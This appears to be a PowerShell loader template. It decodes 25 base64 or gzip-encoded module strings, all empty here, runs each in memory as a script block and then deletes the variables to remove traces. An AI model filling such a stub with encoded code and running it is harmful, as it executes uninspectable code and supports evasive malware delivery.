#Requires -Version 2

$Remounting = ""
$Dumbwaiter = ""
$Sanitation = ""
$Subjective = ""
$Curtseying = ""
$Scrunching = ""
$Discharges = ""
$Wholesales = ""
$Emphasized = ""
$Letterhead = ""
$Algorithms = ""
$Transforms = ""
$Solidarity = ""
$Horrendous = ""
$Fracturing = ""
$Pompadours = ""
$Bestirring = ""
$Specifiers = ""
$Mercerized = ""
$Mechanizes = ""
$Inamoratas = ""
$Bankruptcy = ""
$Overacting = ""
$Confidante = ""
$Bloomfield = ""

$Modules = @($Remounting,$Dumbwaiter,$Sanitation,$Subjective,$Curtseying,$Scrunching,$Discharges,$Wholesales,$Emphasized,$Letterhead,$Algorithms,$Transforms,$Solidarity,$Horrendous,$Fracturing,$Pompadours,$Bestirring,$Specifiers,$Mercerized,$Mechanizes,$Inamoratas,$Bankruptcy,$Overacting,$Confidante,$Bloomfield)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Remounting","Dumbwaiter","Sanitation","Subjective","Curtseying","Scrunching","Discharges","Wholesales","Emphasized","Letterhead","Algorithms","Transforms","Solidarity","Horrendous","Fracturing","Pompadours","Bestirring","Specifiers","Mercerized","Mechanizes","Inamoratas","Bankruptcy","Overacting","Confidante","Bloomfield") | ForEach-Object { Remove-Variable -Name $_ }
